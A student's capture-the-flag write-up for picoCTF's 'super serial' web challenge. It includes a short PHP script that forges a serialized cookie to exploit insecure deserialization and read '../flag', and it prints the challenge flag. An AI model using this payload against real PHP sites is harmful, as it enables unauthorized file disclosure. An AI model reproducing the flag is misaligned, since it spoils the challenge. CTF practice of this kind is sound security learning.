CHALLENGE NAME: super serial
CAT: web
POINTS: 130
FLAG: picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
*I read the write up on this (citation at end)*

Given: the only page is index.php, so check out robots.txt for hints on where the lizard people don't want you to go. You'll find admin.phps, which, to me,
meant nothing since typing it into the url results in "not found."

Next: inspect source. You'll see a file, authentication.php, is reference. If we look at /authentication.phps, we see the source code. At this point, I realize 
that the website is down for some reason so I'll be recreating the steps blindly from here out.

Vuln: Serialize. Basically, php serializes cookie login data, and one of the handles for a failure to assert that the cookie belongs to a guest or admin is to 
print out what the unserialized permissions data is. We can take advantage of this by creating a passing access_log data instead of login data and assigning 
the log_file to "../flag".

Exploit: 
run in a php compiler to get cookie payload 
```
<?php

class access_log
{
  public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log()))))
	
?>
```
go into cookie editor and set name to login and data to the encoded php log_file data. 

*I barely understand this, and the write-up servers as a forcing function to solidify some loose understandings of how this works*
https://www.youtube.com/watch?v=Eu3nFVAwAK0
https://ctftime.org/writeup/27016
https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
